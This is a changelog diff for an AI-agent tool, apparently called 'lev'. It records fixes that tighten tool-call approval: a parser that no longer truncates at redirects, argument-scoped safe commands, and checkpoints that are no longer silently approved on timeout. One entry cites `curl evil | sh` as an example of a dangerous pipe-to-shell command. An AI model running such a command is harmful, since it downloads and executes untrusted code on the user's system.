@@ -13,6 +13,41 @@ same list.
 
 ## Unreleased
 
+- Approving tool calls no longer means approving one per shell invocation.
+  Replaying a real 224-call run through the shipped approval machinery needed 46
+  prompts; the same replay now needs 16. Three things changed. The parser that
+  decides what a grant covers is quote-aware and no longer truncates a command
+  line at its first redirect, which was both a soundness hole (a grant covered
+  programs after the redirect that the user never saw) and the reason keys like
+  `shell:Could not` and `shell:for i` existed. `[safe_commands]` adds an
+  argument-scoped middle between "prompt on every `ls`" and "no prompt on
+  `curl evil | sh`", shipped with a read-only verb list that is on by default.
+  And the context tools, which write the agent's own context regions rather than
+  the filesystem, no longer prompt at all.
+- An approval now has three scopes rather than two: once, for this stage, and
+  for this run. Each option names what it grants ("Allow git status, ls for this
+  stage") instead of saying "for this session" and leaving the user to guess,
+  and a call with nothing reusable to grant says so rather than offering a scope
+  the dispatcher would silently drop. Nothing is written to disk; a grant dies
+  with the run that made it. `session` stays the wire name for run scope, so
+  `lev respond --session`, the REST `"scope": "session"` and the ACP
+  `allow-always` option are unchanged.
+- Fixed: a grant used to skip policy resolution entirely, so a grant made under
+  one stage survived into a later stage whose `tool_permissions` denied the
+  tool. "A configured deny is terminal" now holds across a stage boundary.
+- Fixed: an interaction point declaring `unattended = "ask"` that nobody
+  answered was **approved** when the interaction timeout passed. An empty answer
+  routed through the same branch as an ordinary approval, so `lev run --yolo` in
+  CI waited an hour and then approved the plan nobody read and wrote code from
+  it. An unanswered held checkpoint now stops the run with an error naming it.
+  Points left on the default `auto_approve` are unaffected.
+- `lev run --yolo` prints which checkpoints will still stop for a person before
+  the run starts, and `lev validate` reports them as `holds-under-yolo`.
+  `--yolo` waives approvals, not checkpoints, and a run that stops anyway used
+  to be indistinguishable from a hang.
+- New: `lev approvals safe` prints what runs without an approval prompt and
+  which file put each entry there.
+
 ## 0.2.0 - 2026-08-04
 
 - Windows no longer flashes console windows across the desktop. Every child
